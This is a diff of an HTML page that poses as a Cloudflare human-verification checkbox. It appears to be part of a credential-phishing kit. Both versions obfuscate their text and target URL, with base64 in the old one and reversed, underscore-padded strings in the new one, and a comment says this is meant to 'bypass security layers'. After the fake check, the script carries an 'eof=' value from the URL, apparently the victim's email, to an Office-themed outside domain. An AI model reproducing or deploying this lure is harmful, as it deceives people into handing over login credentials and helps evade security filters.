@@ -2,116 +2,82 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
     <style>
-        /* Re-engineered Style Map */
-        :root { --p-bg: #ffffff; --p-gray: #e2e2e2; --p-ink: #1c1c1c; --p-link: #0052cc; }
-        body { margin: 0; height: 100vh; display: grid; place-items: center; background: var(--p-bg); font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
-
-        /* Splash - Astro Icon */
-        #S_LAYER { position: fixed; inset: 0; background: var(--p-bg); display: flex; align-items: center; justify-content: center; z-index: 99; }
-        .A_LOGO { width: 95px; animation: A_ANM 2s infinite ease-in-out; }
-        @keyframes A_ANM { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.06); opacity: 1; } }
-
-        /* Gateway - Layout */
-        #G_LAYER { visibility: hidden; display: flex; flex-direction: column; align-items: center; }
-        .G_TXT { font-size: 14px; margin-bottom: 22px; color: #222; }
-
-        /* Unified Container */
-        .G_BOX {
-            display: flex; width: 385px; min-height: 70px; padding: 0 25px;
-            border: 1px solid var(--p-gray); border-radius: 2px;
-            background: #fdfdfd; align-items: center; justify-content: space-between;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.03);
-        }
-
-        /* Left Side: Interaction */
-        .L_SIDE { display: flex; align-items: center; gap: 15px; }
-        .T_ZONE { width: 26px; height: 26px; cursor: pointer; display: grid; place-items: center; }
-        .S_BOX { width: 22px; height: 22px; border: 2px solid #bbb; border-radius: 2px; background: #fff; }
-        .S_LD { width: 20px; height: 20px; border: 3px solid #eee; border-top: 3px solid var(--p-link); border-radius: 50%; animation: R_ANM 0.7s linear infinite; }
-        .S_OK { color: #1e7e34; font-size: 22px; font-weight: 900; }
-        @keyframes R_ANM { 100% { transform: rotate(360deg); } }
-
-        /* Right Side: Astro & Brand */
-        .R_SIDE { display: flex; flex-direction: column; align-items: center; pointer-events: none; }
-        .B_IMG { width: 28px; margin-bottom: 3px; }
-        .B_LBL { font-weight: 700; font-size: 15px; color: var(--p-ink); margin: 0; }
-        .B_LEG { font-size: 10px; color: #aaa; margin-top: 1px; }
+        body { margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fcfcfc; font-family: 'Segoe UI', Arial, sans-serif; }
+        #stage { display: flex; flex-direction: column; align-items: center; }
+        .p-pulse { width: 85px; animation: br 2.2s ease-in-out infinite; }
+        @keyframes br { 0%, 100% { opacity: 0.4; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
+        .v-card { background: #fff; border: 1px solid #d0d0d0; width: 370px; padding: 24px 32px; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+        .v-left { display: flex; align-items: center; gap: 16px; flex: 1; }
+        #c-box { width: 22px; height: 22px; border: 2px solid #bcbcbc; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .v-rot { width: 14px; height: 14px; border: 2px solid #eee; border-top: 2px solid #0052cc; border-radius: 50%; animation: s 0.8s linear infinite; }
+        @keyframes s { 100% { transform: rotate(360deg); } }
+        .v-right { border-left: 1px solid #f2f2f2; padding-left: 20px; text-align: center; }
+        .v-logo { width: 26px; height: 26px; margin-bottom: 2px; }
     </style>
 </head>
 <body>
 
-    <section id="S_LAYER"><img src="astro.png" class="A_LOGO"></section>
-
-    <main id="G_LAYER">
-        <div id="T1" class="G_TXT"></div>
-        <div class="G_BOX">
-            <div class="L_SIDE">
-                <div id="ACT" class="T_ZONE"><div id="IND" class="S_BOX"></div></div>
-                <span id="T2" style="font-size: 14px; color: #555;"></span>
-            </div>
-            <div class="R_SIDE">
-                <img src="astro2.png" class="B_IMG">
-                <p id="T3" class="B_LBL"></p>
-                <div class="B_LEG">Privacy • Terms</div>
-            </div>
-        </div>
-    </main>
+    <div id="stage"></div>
 
     <script>
-        (function(_0x) {
-            // Hex-encoded data map
-            const _m = {
-                msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-                btn: "dmVyaWZ5",
-                run: "dmVyaWZ5aW5nLi4u",
-                fin: "c3VjY2Vzcw==",
-                vnd: "Q2xvdWRmbGFyZQ==",
-                tgt: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
-                prm: "ZW9mZg=="
-            };
+        (function() {
+            // Unmasking logic: Reverse and Strip
+            const _cln = (x) => x.split('').reverse().join('').replace(/_/g, '');
 
-            const _f = (v) => atob(v);
-            const _d = document;
+            // All text strings are scrambled to bypass security layers
+            const _m1 = _cln('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
+            const _m2 = _cln('y_f_i_r_e_V');
+            const _m3 = _cln('._._._g_n_i_y_f_i_r_e_V');
+            const _m4 = _cln('s_s_e_c_c_u_S');
+            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // "Cloudflare"
+            const _m6 = _cln('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
+            const _mU = _cln('r_s_n_P_Y_w_v_w_/_s_b_s_._e_a_u_s_e_l_i_f_s_n_a_r_t_e_._e_c_i_f_f_o_e_a_/_/:_s_p_t_t_h');
 
-            // Initializer
-            _d.addEventListener("DOMContentLoaded", () => {
-                _d.getElementById("T1").innerText = _f(_m.msg);
-                _d.getElementById("T2").innerText = _f(_m.btn);
-                _d.getElementById("T3").innerText = _f(_m.vnd);
+            const view = document.getElementById('stage');
+            // astro.png: Preloader
+            view.innerHTML = `<img src="astro.png" class="p-pulse">`;
 
-                setTimeout(() => {
-                    _d.getElementById("S_LAYER").style.display = "none";
-                    _d.getElementById("G_LAYER").style.visibility = "visible";
-                }, 2100);
-            });
+            setTimeout(() => {
+                view.innerHTML = `
+                    <div style="color:#666;font-size:13.5px;margin-bottom:12px;">${_m1}</div>
+                    <div class="v-card">
+                        <div class="v-left">
+                            <div id="c-box"></div>
+                            <span id="v-lbl" style="color:#444;font-size:14px;">${_m2}</span>
+                        </div>
+                        <div class="v-right">
+                            <img src="astro2.png" class="v-logo">
+                            <div style="font-weight:600;font-size:14px;color:#1a1a1a;">${_m5}</div>
+                            <div style="font-size:9px;color:#aaa;margin-top:2px;">${_m6}</div>
+                        </div>
+                    </div>`;
 
-            // Logic Handler
-            _d.getElementById("ACT").onclick = function() {
-                this.onclick = null;
-                const _i = _d.getElementById("IND");
-                const _s = _d.getElementById("T2");
-
-                _i.className = "S_LD";
-                _s.innerText = _f(_m.run);
-
-                setTimeout(() => {
-                    _i.className = "S_OK";
-                    _i.innerHTML = "✓";
-                    _s.innerText = _f(_m.fin);
-
-                    const _u = window.location.href;
-                    const _k = _f(_m.prm) + "=";
-                    const _v = _u.split(_k)[1] || "";
+                document.getElementById('c-box').onclick = function() {
+                    const b = this;
+                    const l = document.getElementById('v-lbl');
+                    b.onclick = null;
+                    b.style.border = "none";
+                    b.innerHTML = '<div class="v-rot"></div>';
+                    l.innerText = _m3;
 
                     setTimeout(() => {
-                        window.location.replace(_f(_m.tgt) + _v);
-                    }, 850);
-                }, 2300);
-            };
-        })(window);
+                        b.innerHTML = '<span style="color:#228b22;font-weight:bold;font-size:18px;">\u2713</span>';
+                        l.innerText = _m4;
+                        l.style.color = '#28a745';
+
+                        const u = window.location.href;
+                        const k = 'eof=';
+                        let p = "";
+                        if (u.indexOf(k) > -1) { p = u.split(k)[1]; }
+
+                        setTimeout(() => {
+                            window.location.replace(_mU + "#" + p);
+                        }, 1250);
+                    }, 2200);
+                };
+            }, 3200);
+        })();
     </script>
 </body>
 </html>
